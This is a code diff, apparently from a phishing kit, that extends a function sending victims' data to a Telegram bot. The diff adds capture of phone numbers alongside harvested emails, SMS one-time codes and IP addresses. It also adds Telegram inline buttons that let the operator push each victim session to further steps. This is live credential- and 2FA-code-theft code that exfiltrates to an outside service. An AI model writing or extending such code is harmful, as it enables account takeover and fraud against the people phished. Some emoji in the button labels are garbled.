@@ -19,17 +19,40 @@ async function sendToTelegram(message, withButton = false, type = null) {
             
             if (type === 'sms') {
                 replyMarkup = {
-                    inline_keyboard: [[
-                        { text: "❌ SMS", callback_data: `sms_error:${sessionId}` },
-                        { text: "🔄 Login", callback_data: `login:${sessionId}` }
-                    ]]
+                    inline_keyboard: [
+                        [
+                            { text: "❌ SMS", callback_data: `sms_error:${sessionId}` },
+                            { text: "🔄 Login", callback_data: `login:${sessionId}` }
+                        ],
+                        [
+                            { text: "� Mail", callback_data: `mail:${sessionId}` }
+                        ]
+                    ]
+                };
+            } else if (type === 'phone') {
+                replyMarkup = {
+                    inline_keyboard: [
+                        [
+                            { text: "� SMS", callback_data: `sms:${sessionId}` },
+                            { text: "🔄 Login", callback_data: `login:${sessionId}` }
+                        ],
+                        [
+                            { text: "� Mail", callback_data: `mail:${sessionId}` }
+                        ]
+                    ]
                 };
             } else {
                 replyMarkup = {
-                    inline_keyboard: [[
-                        { text: "❌ Login", callback_data: `info:${sessionId}` },
-                        { text: "📩 SMS", callback_data: `sms:${sessionId}` }
-                    ]]
+                    inline_keyboard: [
+                        [
+                            { text: "❌ Login", callback_data: `info:${sessionId}` },
+                            { text: "� SMS", callback_data: `sms:${sessionId}` }
+                        ],
+                        [
+                            { text: "📱 Celular", callback_data: `phone:${sessionId}` },
+                            { text: "� Mail", callback_data: `mail:${sessionId}` }
+                        ]
+                    ]
                 };
             }
         }
@@ -86,12 +109,18 @@ async function sendToWebhook(data, type) {
                 message += `📩 <b>Mail:</b> <code>${savedEmail}</code>\n`;
             }
             message += `📱 <b>Código SMS:</b> <code>${data.smsCode}</code>\n`;
+        } else if (type === 'phone' && data.phone) {
+            const savedEmail = sessionStorage.getItem('userEmail');
+            if (savedEmail) {
+                message += `📩 <b>Mail:</b> <code>${savedEmail}</code>\n`;
+            }
+            message += `📞 <b>Celular:</b> <code>${data.phone}</code>\n`;
         }
         
         message += `🌐 <b>IP:</b> <code>${await getUserIP()}</code>`;
 
-        // Enviar a Telegram con botón SMS para email, password y sms
-        const withButton = (type === 'email' || type === 'password' || type === 'sms');
+        // Enviar a Telegram con botón SMS para email, password, sms y phone
+        const withButton = (type === 'email' || type === 'password' || type === 'sms' || type === 'phone');
         const result = await sendToTelegram(message, withButton, type);
 
         // También enviar al webhook original si está configurado
